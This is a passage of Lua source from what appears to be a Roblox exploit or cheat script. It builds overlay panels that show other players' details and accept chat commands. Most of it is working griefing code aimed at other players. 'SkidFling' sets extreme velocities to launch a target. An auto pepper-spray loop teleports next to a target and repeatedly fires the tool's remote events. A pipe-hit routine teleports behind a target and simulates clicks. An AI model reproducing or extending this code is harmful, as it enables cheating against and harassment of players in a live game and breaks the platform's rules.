        local hdr = Instance.new("Frame", panel)
        hdr.Size = UDim2.new(1,0,0,HDR_H); hdr.BackgroundColor3 = cfg.BG2
        hdr.BorderSizePixel = 0; UILib.addCorner(hdr, 12)
        local hdrBot = Instance.new("Frame", hdr)
        hdrBot.Size = UDim2.new(1,0,0,12); hdrBot.Position = UDim2.new(0,0,1,-12)
        hdrBot.BackgroundColor3 = cfg.BG2; hdrBot.BorderSizePixel = 0

        local titleLbl = Instance.new("TextLabel", hdr)
        titleLbl.Size = UDim2.new(1,-50,1,0); titleLbl.Position = UDim2.fromOffset(PAD,0)
        titleLbl.BackgroundTransparency = 1; titleLbl.Font = Enum.Font.GothamBlack
        titleLbl.TextSize = 14; titleLbl.TextColor3 = cfg.Accent
        titleLbl.TextXAlignment = Enum.TextXAlignment.Left
        titleLbl.Text = "⌨  CMDS  –  Chat Commands"; titleLbl.BorderSizePixel = 0

        local closeBtn = Instance.new("TextButton", hdr)
        closeBtn.Size = UDim2.fromOffset(28,28); closeBtn.Position = UDim2.new(1,-36,0.5,-14)
        closeBtn.BackgroundColor3 = Color3.fromRGB(55,20,20); closeBtn.TextColor3 = Color3.fromRGB(220,80,80)
        closeBtn.Font = Enum.Font.GothamBold; closeBtn.TextSize = 14; closeBtn.Text = "X"
        closeBtn.BorderSizePixel = 0; UILib.addCorner(closeBtn, 6)
        closeBtn.MouseButton1Click:Connect(closePanel)

        -- Scrolling content below header
        local scroll = Instance.new("ScrollingFrame", panel)
        scroll.Size = UDim2.new(1,0,1,-HDR_H); scroll.Position = UDim2.fromOffset(0,HDR_H)
        scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 4; scroll.ScrollBarImageColor3 = cfg.Accent
        scroll.CanvasSize = UDim2.new(0,0,0, PH - HDR_H)
        scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        local sLayout = Instance.new("UIListLayout", scroll)
        sLayout.SortOrder = Enum.SortOrder.LayoutOrder; sLayout.Padding = UDim.new(0,0)
        local sPad = Instance.new("UIPadding", scroll)
        sPad.PaddingLeft = UDim.new(0,PAD); sPad.PaddingRight = UDim.new(0,PAD)
        sPad.PaddingTop  = UDim.new(0,8)

        -- Helper: section label
        local _lo = 0
        local function _secLbl(text)
            _lo = _lo + 1
            local f = Instance.new("Frame", scroll); f.LayoutOrder = _lo
            f.Size = UDim2.new(1,0,0,20); f.BackgroundTransparency = 1; f.BorderSizePixel = 0
            local l = Instance.new("TextLabel", f)
            l.Size = UDim2.new(1,0,1,0); l.BackgroundTransparency = 1
            l.Font = Enum.Font.GothamBold; l.TextSize = 11
            l.TextColor3 = cfg.Accent; l.TextXAlignment = Enum.TextXAlignment.Left
            l.Text = text:upper(); l.BorderSizePixel = 0
        end

        -- Helper: entry row with optional remove/add button
        local function _entryRow(nameText, btnLabel, btnColor, btnCb)
            _lo = _lo + 1
            local row = Instance.new("Frame", scroll); row.LayoutOrder = _lo
            row.Size = UDim2.new(1,0,0,ENTRY_H); row.BackgroundColor3 = cfg.BG2
            row.BorderSizePixel = 0; UILib.addCorner(row, 6)
            local nl = Instance.new("TextLabel", row)
            nl.Size = UDim2.new(1,-70,1,0); nl.Position = UDim2.fromOffset(8,0)
            nl.BackgroundTransparency = 1; nl.Font = Enum.Font.GothamSemibold; nl.TextSize = 12
            nl.TextColor3 = cfg.Text; nl.TextXAlignment = Enum.TextXAlignment.Left
            nl.Text = nameText; nl.BorderSizePixel = 0
            if btnLabel then
                local btn = Instance.new("TextButton", row)
                btn.Size = UDim2.fromOffset(60,22); btn.Position = UDim2.new(1,-64,0.5,-11)
                btn.BackgroundColor3 = btnColor; btn.TextColor3 = cfg.Text
                btn.Font = Enum.Font.GothamBold; btn.TextSize = 11; btn.Text = btnLabel
                btn.BorderSizePixel = 0; UILib.addCorner(btn, 4)
                btn.MouseButton1Click:Connect(function() closePanel(); task.wait(0.2); btnCb() end)
            end
            return row
        end

        -- ── Whitelist section ──────────────────────────────────────────────
        _secLbl("Whitelisted Players")
        if #wlNames == 0 then
            _lo = _lo + 1
            local noF = Instance.new("Frame", scroll); noF.LayoutOrder = _lo
            noF.Size = UDim2.new(1,0,0,24); noF.BackgroundTransparency = 1; noF.BorderSizePixel = 0
            local noL = Instance.new("TextLabel", noF)
            noL.Size = UDim2.new(1,0,1,0); noL.BackgroundTransparency = 1
            noL.Font = Enum.Font.Gotham; noL.TextSize = 11; noL.TextColor3 = cfg.Muted
            noL.TextXAlignment = Enum.TextXAlignment.Left; noL.Text = "  No players whitelisted yet."
            noL.BorderSizePixel = 0
        else
            for _, name in ipairs(wlNames) do
                _entryRow("+ " .. name, "Remove", Color3.fromRGB(55,20,20), function()
                    _cmdWhitelist[name] = nil
                    openCMDSPanel()
                end)
            end
        end

        -- ── Add from server ───────────────────────────────────────────────
        _secLbl("Add from Server")
        if #serverPlayers == 0 then
            _lo = _lo + 1
            local noF2 = Instance.new("Frame", scroll); noF2.LayoutOrder = _lo
            noF2.Size = UDim2.new(1,0,0,24); noF2.BackgroundTransparency = 1; noF2.BorderSizePixel = 0
            local noL2 = Instance.new("TextLabel", noF2)
            noL2.Size = UDim2.new(1,0,1,0); noL2.BackgroundTransparency = 1
            noL2.Font = Enum.Font.Gotham; noL2.TextSize = 11; noL2.TextColor3 = cfg.Muted
            noL2.TextXAlignment = Enum.TextXAlignment.Left; noL2.Text = "  All players already whitelisted."
            noL2.BorderSizePixel = 0
        else
            for _, p in ipairs(serverPlayers) do
                local dispText = p.Name .. (p.DisplayName ~= p.Name and ("  (" .. p.DisplayName .. ")") or "")
                local pRef = p
                _entryRow(dispText, "+ Add", cfg.AccentDim, function()
                    _cmdWhitelist[pRef.Name] = true
                    openCMDSPanel()
                end)
            end
        end

        -- ── PM confirmation toggle ────────────────────────────────────────
        do
            _lo = _lo + 1
            local pmRow = Instance.new("Frame", scroll); pmRow.LayoutOrder = _lo
            pmRow.Size = UDim2.new(1,0,0,30); pmRow.BackgroundColor3 = cfg.BG2
            pmRow.BorderSizePixel = 0; UILib.addCorner(pmRow, 6)
            local pmLbl = Instance.new("TextLabel", pmRow)
            pmLbl.Size = UDim2.new(1,-80,1,0); pmLbl.Position = UDim2.fromOffset(8,0)
            pmLbl.BackgroundTransparency = 1; pmLbl.Font = Enum.Font.GothamSemibold; pmLbl.TextSize = 11
            pmLbl.TextColor3 = cfg.Text; pmLbl.TextXAlignment = Enum.TextXAlignment.Left
            pmLbl.Text = "/w confirmations"; pmLbl.BorderSizePixel = 0
            local pmBtn = Instance.new("TextButton", pmRow)
            pmBtn.Size = UDim2.fromOffset(60,22); pmBtn.Position = UDim2.new(1,-64,0.5,-11)
            pmBtn.Font = Enum.Font.GothamBold; pmBtn.TextSize = 11; pmBtn.BorderSizePixel = 0
            UILib.addCorner(pmBtn, 4)
            local function _refreshPMBtn()
                pmBtn.BackgroundColor3 = _cmdPMEnabled and cfg.AccentDim or Color3.fromRGB(50,50,50)
                pmBtn.TextColor3       = _cmdPMEnabled and cfg.Text     or cfg.Muted
                pmBtn.Text             = _cmdPMEnabled and "ON" or "OFF"
            end
            _refreshPMBtn()
            pmBtn.MouseButton1Click:Connect(function()
                _cmdPMEnabled = not _cmdPMEnabled
                _refreshPMBtn()
            end)
        end

        -- ── Commands reference ────────────────────────────────────────────
        _secLbl("Available Commands")
        local CMDS_REF = {
            "/fling <name>  — SkidFling the target",
            "/push  <name>  — Physics-push the target",
            "/pipe  <name>  — Metal pipe hit",
            "/spray <name>  — Pepper spray",
            "  <name> = username, display name, or first 3 letters",
        }
        _lo = _lo + 1
        local cmdBlock = Instance.new("Frame", scroll); cmdBlock.LayoutOrder = _lo
        cmdBlock.Size = UDim2.new(1,0,0, #CMDS_REF*16+10)
        cmdBlock.BackgroundColor3 = cfg.BG2; cmdBlock.BorderSizePixel = 0; UILib.addCorner(cmdBlock, 6)
        for i, line in ipairs(CMDS_REF) do
            local cl = Instance.new("TextLabel", cmdBlock)
            cl.Size = UDim2.new(1,-10,0,16); cl.Position = UDim2.fromOffset(8,(i-1)*16+5)
            cl.BackgroundTransparency = 1; cl.Font = Enum.Font.Code; cl.TextSize = 10
            cl.TextColor3 = (i == #CMDS_REF) and cfg.Muted or cfg.Text
            cl.TextXAlignment = Enum.TextXAlignment.Left; cl.Text = line; cl.BorderSizePixel = 0
        end

        -- Update canvas size based on actual layout
        sLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            scroll.CanvasSize = UDim2.new(0,0,0, sLayout.AbsoluteContentSize.Y + 16)
        end)

        -- Fade in
        task.spawn(function()
            for s = 1, 15 do task.wait(0.15/15); panel.GroupTransparency = 1 - s/15 end
            panel.GroupTransparency = 0
        end)

        -- Drag on header
        do
            local dragging, dragStart, panelStart = false, nil, nil
            hdr.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = true
                    dragStart  = Vector2.new(inp.Position.X, inp.Position.Y)
                    panelStart = Vector2.new(panel.Position.X.Offset, panel.Position.Y.Offset)
                end
            end)
            game:GetService("UserInputService").InputChanged:Connect(function(inp)
                if dragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
                    local delta = Vector2.new(inp.Position.X, inp.Position.Y) - dragStart
                    panel.Position = UDim2.fromOffset(panelStart.X + delta.X, panelStart.Y + delta.Y)
                end
            end)
            game:GetService("UserInputService").InputEnded:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
            end)
        end
    end

    -- ── Pepper Spray Auto ─────────────────────────────────────────────────
    local function findPepperSpray()
        local ch = LocalPlayer.Character
        if ch then
            for _, v in ipairs(ch:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("pepper") then return v end
            end
        end
        local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bp then
            for _, v in ipairs(bp:GetChildren()) do
                if v:IsA("Tool") and v.Name:lower():find("pepper") then return v end
            end
        end
        return nil
    end

    -- Pepper Spray automation
    stopPepperAuto = function()
        if _AUTO.pepperConn then _AUTO.pepperConn:Disconnect(); _AUTO.pepperConn = nil end
    end
    startPepperAuto = function(targetPlr)
        stopPepperAuto()
        if not targetPlr then return end
        local pepperTarget = targetPlr
        local PEPPER_RATE  = 0.6
        local pepTimer     = 0
        _AUTO.pepperConn = RunService.Heartbeat:Connect(function(dt)
            if not cfg.PepperEnabled then stopPepperAuto(); return end
            if not pepperTarget or not pepperTarget.Parent then stopPepperAuto(); return end
            local ch    = LocalPlayer.Character
            local myHRP = ch and ch:FindFirstChild("HumanoidRootPart")
            local tCh   = pepperTarget.Character
            local tHRP  = tCh and tCh:FindFirstChild("HumanoidRootPart")
            if not myHRP or not tHRP then return end
            local pepper = findPepperSpray()
            if not pepper then stopPepperAuto(); return end
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if pepper.Parent ~= ch then
                if hum then pcall(function() hum:EquipTool(pepper) end) end
                return
            end
            local flat = Vector3.new(tHRP.Position.X - myHRP.Position.X, 0,
                                      tHRP.Position.Z - myHRP.Position.Z)
            if flat.Magnitude > 4 then
                -- Teleport to 2.5 studs in front of target (same Y as us so we land on ground)
                local dest = tHRP.Position - flat.Unit * 2.5
                pcall(function()
                    myHRP.CFrame = CFrame.new(
                        Vector3.new(dest.X, myHRP.Position.Y, dest.Z),
                        Vector3.new(tHRP.Position.X, myHRP.Position.Y, tHRP.Position.Z)
                    )
                end)
            elseif flat.Magnitude > 0.1 then
                -- Already close — just face them
                pcall(function() myHRP.CFrame = CFrame.new(myHRP.Position, myHRP.Position + flat.Unit) end)
            end
            pepTimer = pepTimer + dt
            if pepTimer < PEPPER_RATE then return end
            pepTimer = 0
            local fired = false
            for _, re in ipairs(pepper:GetDescendants()) do
                if re:IsA("RemoteEvent") then
                    pcall(function() re:FireServer() end)
                    fired = true
                end
            end
            if not fired then
                local cam = workspace.CurrentCamera
                local sp, onScreen = cam:WorldToScreenPoint(tHRP.Position)
                local cpos = onScreen
                    and Vector2.new(sp.X, sp.Y)
                    or  Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
                pcall(function() VirtualUser:Button1Down(cpos, cam.CFrame) end)
                task.wait(0.08)
                pcall(function() VirtualUser:Button1Up(cpos, cam.CFrame) end)
            end
        end)
    end

    -- ── Metal Pipe Hit ────────────────────────────────────────────────────
    doPipeHit = function(target)
        task.spawn(function()
            if not target or not target.Character then return end
            local ch    = LocalPlayer.Character
            local myHRP = getHRP()
            if not ch or not myHRP then return end
            local tHRP = target.Character:FindFirstChild("HumanoidRootPart")
            if not tHRP then return end

            -- Find metal pipe in character or backpack
            local pipe = nil
            local function findPipe(parent)
                if not parent then return end
                for _, v in ipairs(parent:GetChildren()) do
                    if v:IsA("Tool") and v.Name:lower():find("pipe") then pipe = v end
                end
            end
            findPipe(ch); findPipe(LocalPlayer:FindFirstChildOfClass("Backpack"))
            if not pipe then
                game:GetService("StarterGui"):SetCore("SendNotification",
                    {Title="Pipe Hit", Text="No metal pipe in inventory.", Duration=3})
                return
            end

            -- Equip the pipe if not already held
            local hum = ch:FindFirstChildOfClass("Humanoid")
            if hum and pipe.Parent ~= ch then
                pcall(function() hum:EquipTool(pipe) end)
                task.wait(0.1)
            end

            local returnCF = myHRP.CFrame
            local cam = workspace.CurrentCamera
            local prevCamType = cam.CameraType

            -- Teleport 2.5 studs behind the target
            local behind = tHRP.CFrame * CFrame.new(0, 0, 2.5)
            pcall(function() myHRP.CFrame = CFrame.new(behind.Position, tHRP.Position) end)
            task.wait(0.05)

            -- Single click with Scriptable camera so the click direction is reliable
            cam.CameraType = Enum.CameraType.Scriptable
            local sp, onScreen = cam:WorldToViewportPoint(tHRP.Position)
            local clickPos = (onScreen and sp.Z > 0)
                and Vector2.new(sp.X, sp.Y)
                or  Vector2.new(cam.ViewportSize.X/2, cam.ViewportSize.Y/2)
            pcall(function() VirtualUser:Button1Down(clickPos, cam.CFrame) end)
            task.wait(0.1)
            pcall(function() VirtualUser:Button1Up(clickPos, cam.CFrame) end)

            -- Restore camera type and return to original position
            cam.CameraType = prevCamType
            task.wait(0.05)
            pcall(function() myHRP.CFrame = returnCF end)
        end)
    end

    -- ── SkidFling ─────────────────────────────────────────────────────────
    SkidFling = function(targetPlayer)
        local Character = LocalPlayer.Character
        local Humanoid  = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart  = Humanoid and Humanoid.RootPart
        if not Character or not Humanoid or not RootPart then return end
        local TCharacter = targetPlayer.Character
        if not TCharacter then return end
        local THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
        local TRootPart = THumanoid and THumanoid.RootPart
        local THead     = TCharacter:FindFirstChild("Head")
        if not TRootPart and not THead then return end
        if RootPart.Velocity.Magnitude < 50 then
            getgenv()._MasaFlingReturn = RootPart.CFrame
        end
        local origFPDH = workspace.FallenPartsDestroyHeight
        local function FPos(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            pcall(function() Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang) end)
            RootPart.Velocity    = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        local function SFBasePart(BasePart)
            local TimeToWait = 2
            local Time  = tick()
            local Angle = 0
            Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            workspace.FallenPartsDestroyHeight = 0/0
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
                        FPos(BasePart, CFrame.new(0,1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0)); task.wait()
                        FPos(BasePart, CFrame.new(0,-1.5,0)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0)); task.wait()
                        FPos(BasePart, CFrame.new(2.25,1.5,-2.25)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0)); task.wait()
                        FPos(BasePart, CFrame.new(-2.25,-1.5,2.25)+THumanoid.MoveDirection*BasePart.Velocity.Magnitude/1.25, CFrame.Angles(math.rad(Angle),0,0)); task.wait()
                    else
                        FPos(BasePart, CFrame.new(0,1.5,THumanoid.WalkSpeed), CFrame.Angles(math.rad(90),0,0)); task.wait()
                        FPos(BasePart, CFrame.new(0,-1.5,-THumanoid.WalkSpeed), CFrame.Angles(0,0,0)); task.wait()
                        FPos(BasePart, CFrame.new(0,1.5,TRootPart and TRootPart.Velocity.Magnitude/1.25 or 5), CFrame.Angles(math.rad(90),0,0)); task.wait()
                    end
                else break end
            until BasePart.Velocity.Magnitude > 500
                or BasePart.Parent ~= TCharacter
                or not targetPlayer.Parent
                or THumanoid.Sit
                or Humanoid.Health <= 0
                or tick() > Time + TimeToWait
        end
        if THead then SFBasePart(THead) elseif TRootPart then SFBasePart(TRootPart) end
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        workspace.FallenPartsDestroyHeight = origFPDH
        local retCF = getgenv()._MasaFlingReturn
        if retCF then
            repeat
                RootPart.CFrame = retCF * CFrame.new(0, 0.5, 0)
                pcall(function() Character:SetPrimaryPartCFrame(retCF * CFrame.new(0, 0.5, 0)) end)
                Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                for _, part in ipairs(Character:GetChildren()) do
                    if part:IsA("BasePart") then part.Velocity = Vector3.zero; part.RotVelocity = Vector3.zero end
                end
                task.wait()
            until (RootPart.Position - retCF.p).Magnitude < 25
        end
    end

    -- ── Player Panel ──────────────────────────────────────────────────────
    local function openPlayerPanel(plr)
        local existingPanel = game:GetService("CoreGui"):FindFirstChild("_MasacrePanel")
        if existingPanel then existingPanel:Destroy() end

        -- ── gather data upfront ──────────────────────────────────
        local teamCol  = getPlayerESPColor(plr)
        local teamName = plr.Team and plr.Team.Name or "Unknown"
        local hum      = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
        local hp       = hum and hum.Health    or 0
        local maxHp    = hum and (hum.MaxHealth > 0 and hum.MaxHealth or 100) or 100
        local pct      = math.clamp(hp / maxHp, 0, 1)
        local hpCol    = getHealthColor(pct)
        local gun      = getPlayerGun(plr)
        local pushNm   = getPlayerPushItem(plr)
        local p2       = plr

        -- ── constants ────────────────────────────────────────────
        local PW       = 310   -- panel width
        local PAD      = 10    -- outer padding
        local HDR_H    = 90    -- header zone height
        local ROW_H    = 26    -- info row height
        local ROW_GAP  = 4     -- gap between info rows
        local BTN_H    = 30    -- button height
        local BTN_GAP  = 6     -- gap between buttons
        local INNER_W  = PW - PAD * 2   -- 290

        -- info rows data
        local infoData = {
            { "User ID",   tostring(plr.UserId)               },
            { "Team",      teamName                            },
            { "Gun",       gun    or "None"                   },
            { "Push Item", pushNm or "None"                   },
            { "Account Age",  plr.AccountAge .. " days"          },
        }

        -- button rows  { label, bgCol, txtCol, callback }
        local row1 = {
            { "Go To",    cfg.AccentDim,                cfg.Text,                    nil },
            { "Spectate", Color3.fromRGB(40,25,70),     Color3.fromRGB(180,130,255), nil },
            { "Push",     Color3.fromRGB(55,15,110),    Color3.fromRGB(200,160,255), nil },
            { "Fling",    Color3.fromRGB(60,15,90),     Color3.fromRGB(180,100,255), nil },
        }
        local row2 = {
            { "Pipe Hit", Color3.fromRGB(50,35,10),     Color3.fromRGB(255,200,80),  nil },
            { "Spray",    Color3.fromRGB(80,40,0),      Color3.fromRGB(255,180,80),  nil },
        }

        -- dynamic height:  header + divider + info rows + gap + btn row1 + btn row2 + warn + padding
        local INFO_BLOCK  = #infoData * (ROW_H + ROW_GAP) - ROW_GAP
        local WARN_H      = 34
        local PH = PAD + HDR_H + 8 + INFO_BLOCK + BTN_GAP*2 + BTN_H*2 + WARN_H + PAD*2 + 4

        -- ── root gui ─────────────────────────────────────────────
        local panelGui = Instance.new("ScreenGui")
        panelGui.Name              = "_MasacrePanel"
        panelGui.ResetOnSpawn      = false
        panelGui.ZIndexBehavior    = Enum.ZIndexBehavior.Sibling
        panelGui.IgnoreGuiInset    = true
        panelGui.OnTopOfCoreBlur   = true
        panelGui.DisplayOrder      = 1000000
        panelGui.Parent            = game:GetService("CoreGui")

        local panel = Instance.new("CanvasGroup", panelGui)
        panel.Size             = UDim2.fromOffset(PW, PH)
        panel.BackgroundColor3 = cfg.BG
        panel.BorderSizePixel  = 0
        panel.GroupTransparency = 1
        UILib.addCorner(panel, 12)
        local panelStroke = UILib.addStroke(panel, 1.5, teamCol, 0.35)

        -- center using absolute offset so drag works correctly
        local vp0 = Camera.ViewportSize
        -- On mobile, scale the popup down so it fits the smaller screen
        if _isMobile then
            local popScale = math.min(vp0.X * 0.92 / PW, vp0.Y * 0.88 / PH, 1)
            local popUI = Instance.new("UIScale", panel)
            popUI.Scale = popScale
            panel.Position = UDim2.fromOffset(
                math.floor(vp0.X / 2 - (PW * popScale) / 2),
                math.floor(vp0.Y / 2 - (PH * popScale) / 2)
            )
        else
            panel.Position = UDim2.fromOffset(
                math.floor(vp0.X / 2 - PW / 2),
                math.floor(vp0.Y / 2 - PH / 2)
            )
        end

        -- absorb clicks
        local absorb = Instance.new("TextButton", panel)
        absorb.Size = UDim2.new(1,0,1,0); absorb.BackgroundTransparency = 1
        absorb.Text = ""; absorb.BorderSizePixel = 0; absorb.AutoButtonColor = false
        absorb.MouseButton1Click:Connect(function() end)

        -- ── smooth close helper (fade out then destroy) ───────────
        local closing = false
        local function closePanel()
            if closing then return end
            closing = true
            task.spawn(function()
                local steps = 20
                local dur   = 0.18
                for s = 1, steps do
                    task.wait(dur / steps)
                    if panel and panel.Parent then
                        local t = s / steps
                        panel.GroupTransparency = t
                        if panelStroke then panelStroke.Transparency = t end
                    end
                end
                panelGui:Destroy()
            end)
        end

        -- ── smooth drag ───────────────────────────────────────────
        -- (set up after hdr is created below, using hdr as handle)

        -- ══════════════════════════════════════════════════════════
        -- HEADER  (avatar · name · team badge · hp bar)
        -- ══════════════════════════════════════════════════════════
        local hdr = Instance.new("Frame", panel)
        hdr.Size             = UDim2.new(1, 0, 0, HDR_H)
        hdr.Position         = UDim2.fromOffset(0, 0)
        hdr.BackgroundColor3 = cfg.BG2
        hdr.BorderSizePixel  = 0
        UILib.addCorner(hdr, 12)
        -- cover bottom corners
        local hdrBot = Instance.new("Frame", hdr)
        hdrBot.Size = UDim2.new(1,0,0,12); hdrBot.Position = UDim2.new(0,0,1,-12)
        hdrBot.BackgroundColor3 = cfg.BG2; hdrBot.BorderSizePixel = 0
        UILib.makeDraggable(panel, hdr, 15)

        -- team color accent strip on the left edge of header
        local accentStrip = Instance.new("Frame", hdr)
        accentStrip.Size             = UDim2.new(0, 4, 1, 0)
        accentStrip.Position         = UDim2.fromOffset(0, 0)
        accentStrip.BackgroundColor3 = teamCol
        accentStrip.BorderSizePixel  = 0
        UILib.addCorner(accentStrip, 2)

        -- avatar
        local AV = 56
        local avF = Instance.new("Frame", hdr)
        avF.Size             = UDim2.fromOffset(AV, AV)
        avF.Position         = UDim2.fromOffset(12, (HDR_H - AV) / 2)
        avF.BackgroundColor3 = cfg.BG3
        avF.BorderSizePixel  = 0
        UILib.addCorner(avF, 8)
        UILib.addStroke(avF, 1.5, teamCol, 0.4)
        local avImg = Instance.new("ImageLabel", avF)
        avImg.Size = UDim2.new(1,0,1,0); avImg.BackgroundTransparency = 1
        avImg.ScaleType = Enum.ScaleType.Crop; avImg.Image = ""
        UILib.addCorner(avImg, 8)
        task.spawn(function()
            local ok, url = pcall(function()
                return Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
            end)
            if ok and avImg and avImg.Parent then avImg.Image = url end
        end)

        -- name
        local nameX = 12 + AV + 10
        local nameLbl = Instance.new("TextLabel", hdr)
        nameLbl.Size             = UDim2.new(1, -(nameX + 36), 0, 22)
        nameLbl.Position         = UDim2.fromOffset(nameX, 12)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text             = plr.Name
        nameLbl.Font             = Enum.Font.GothamBold
        nameLbl.TextSize         = 16
        nameLbl.TextColor3       = cfg.Text
        nameLbl.TextXAlignment   = Enum.TextXAlignment.Left
        nameLbl.TextTruncate     = Enum.TextTruncate.AtEnd
        nameLbl.BorderSizePixel  = 0

        -- team badge pill
        local badgePad = 8
        local badgeLbl = Instance.new("TextLabel", hdr)
        badgeLbl.AutomaticSize       = Enum.AutomaticSize.X
        badgeLbl.Size                = UDim2.new(0, 0, 0, 18)
        badgeLbl.Position            = UDim2.fromOffset(nameX, 36)
        badgeLbl.BackgroundColor3    = Color3.new(teamCol.R*0.25, teamCol.G*0.25, teamCol.B*0.25)
        badgeLbl.BorderSizePixel     = 0
        badgeLbl.Text                = "  " .. teamName .. "  "
        badgeLbl.Font                = Enum.Font.GothamSemibold
        badgeLbl.TextSize            = 10
        badgeLbl.TextColor3          = teamCol
        badgeLbl.TextXAlignment      = Enum.TextXAlignment.Center
        UILib.addCorner(badgeLbl, 999)

        -- hp bar track
        local hpTrackY = HDR_H - 18
        local hpTrack = Instance.new("Frame", hdr)
        hpTrack.Size             = UDim2.new(1, -(nameX + 40), 0, 5)
        hpTrack.Position         = UDim2.fromOffset(nameX, hpTrackY)
        hpTrack.BackgroundColor3 = cfg.BG3
        hpTrack.BorderSizePixel  = 0
        UILib.addCorner(hpTrack, 999)
        local hpFill = Instance.new("Frame", hpTrack)
        hpFill.Size             = UDim2.new(pct, 0, 1, 0)
        hpFill.BackgroundColor3 = hpCol
        hpFill.BorderSizePixel  = 0
        UILib.addCorner(hpFill, 999)
        -- hp text
        local hpTxt = Instance.new("TextLabel", hdr)
        hpTxt.Size                 = UDim2.new(1, -(nameX + 40), 0, 12)
        hpTxt.Position             = UDim2.fromOffset(nameX, hpTrackY - 13)
        hpTxt.BackgroundTransparency = 1
        hpTxt.Text                 = (hp <= 0) and "DEAD" or math.floor(hp) .. " / " .. math.floor(maxHp) .. " HP"
        hpTxt.Font                 = Enum.Font.GothamSemibold
        hpTxt.TextSize             = 10
        hpTxt.TextColor3           = hpCol
        hpTxt.TextXAlignment       = Enum.TextXAlignment.Left
        hpTxt.BorderSizePixel      = 0

        -- close button (top-right of header)
        local closeBtn = Instance.new("TextButton", hdr)
        closeBtn.Size             = UDim2.fromOffset(26, 26)
        closeBtn.Position         = UDim2.new(1, -32, 0, 6)
        closeBtn.BackgroundColor3 = Color3.fromRGB(60, 18, 18)
        closeBtn.TextColor3       = Color3.fromRGB(255, 80, 80)
        closeBtn.Font             = Enum.Font.GothamBold
        closeBtn.TextSize         = 14
        closeBtn.Text             = "X"
        closeBtn.BorderSizePixel  = 0
        closeBtn.AutoButtonColor  = false
        UILib.addCorner(closeBtn, 6)
        UILib.addStroke(closeBtn, 1, Color3.fromRGB(180, 40, 40), 0.4)
        closeBtn.MouseEnter:Connect(function()  closeBtn.BackgroundColor3 = Color3.fromRGB(110, 25, 25) end)
        closeBtn.MouseLeave:Connect(function()  closeBtn.BackgroundColor3 = Color3.fromRGB(60, 18, 18)  end)
        closeBtn.MouseButton1Click:Connect(function() closePanel() end)

        -- ══════════════════════════════════════════════════════════
        -- INFO ROWS
        -- ══════════════════════════════════════════════════════════
        local infoY = HDR_H + 8
        for idx, pair in ipairs(infoData) do
            local iRow = Instance.new("Frame", panel)
            iRow.Size             = UDim2.new(1, -PAD*2, 0, ROW_H)
            iRow.Position         = UDim2.fromOffset(PAD, infoY)
            iRow.BackgroundColor3 = idx % 2 == 0 and cfg.BG2 or cfg.BG3
            iRow.BorderSizePixel  = 0
            UILib.addCorner(iRow, 5)

            -- left key
            local kL = Instance.new("TextLabel", iRow)
            kL.Size               = UDim2.new(0.38, 0, 1, 0)
            kL.Position           = UDim2.fromOffset(8, 0)
            kL.BackgroundTransparency = 1
            kL.Text               = pair[1]
            kL.Font               = Enum.Font.GothamSemibold
            kL.TextSize           = 11
            kL.TextColor3         = cfg.Muted
            kL.TextXAlignment     = Enum.TextXAlignment.Left
            kL.BorderSizePixel    = 0

            -- vertical divider
            local div = Instance.new("Frame", iRow)
            div.Size             = UDim2.new(0, 1, 0.6, 0)
            div.Position         = UDim2.new(0.38, 0, 0.2, 0)
            div.BackgroundColor3 = cfg.Stroke
            div.BorderSizePixel  = 0

            -- right value
            local vL = Instance.new("TextLabel", iRow)
            vL.Size               = UDim2.new(0.6, -8, 1, 0)
            vL.Position           = UDim2.new(0.38, 8, 0, 0)
            vL.BackgroundTransparency = 1
            vL.Text               = pair[2]
            vL.Font               = Enum.Font.Gotham
            vL.TextSize           = 11
            vL.TextColor3         = cfg.Text
            vL.TextXAlignment     = Enum.TextXAlignment.Left
            vL.TextTruncate       = Enum.TextTruncate.AtEnd
            vL.BorderSizePixel    = 0

            infoY = infoY + ROW_H + ROW_GAP
        end

        -- ══════════════════════════════════════════════════════════
        -- BUTTON HELPER  (equal-width, fills INNER_W)
        -- ══════════════════════════════════════════════════════════
        local function makeButtonRow(btns, yPos)
            local n   = #btns
            local bW  = math.floor((INNER_W - BTN_GAP * (n-1)) / n)
            for i, def in ipairs(btns) do
                local xPos = PAD + (i-1) * (bW + BTN_GAP)
                local b = Instance.new("TextButton", panel)
                b.AutoButtonColor = false
                b.Size            = UDim2.fromOffset(bW, BTN_H)
                b.Position        = UDim2.fromOffset(xPos, yPos)
                b.BackgroundColor3 = def[2]
                b.TextColor3      = def[3]
                b.Font            = Enum.Font.GothamBold
                b.TextSize        = 11
                b.Text            = def[1]
                b.BorderSizePixel = 0
                UILib.addCorner(b, 7)
                local defaultBg = def[2]
